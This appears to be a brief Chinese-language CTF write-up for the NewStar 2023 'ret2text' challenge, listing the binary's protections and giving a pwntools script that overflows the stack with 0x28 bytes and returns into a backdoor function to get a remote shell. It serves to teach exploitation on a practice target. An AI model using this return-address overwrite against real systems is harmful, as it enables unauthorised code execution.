---
title: newstar2023 week1 - ret2text
date: 2023/9/25 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 利用ret2text漏洞调用backdoor函数打开shell。
---

## 文件分析

下载`ret2text`, NX on, PIE off, Canary off, RELRO full  
ghidra分析为64位程序

## 解题思路

`backdoor`函数直接打开sh了，打就完了

## EXPLOIT

```python
from pwn import *
sh = remote("node4.buuoj.cn", 29533)
sh.sendline(b'0'*0x28 + p64(0x004011fb)) # addr of backdoor
sh.interactive()
```

Done.
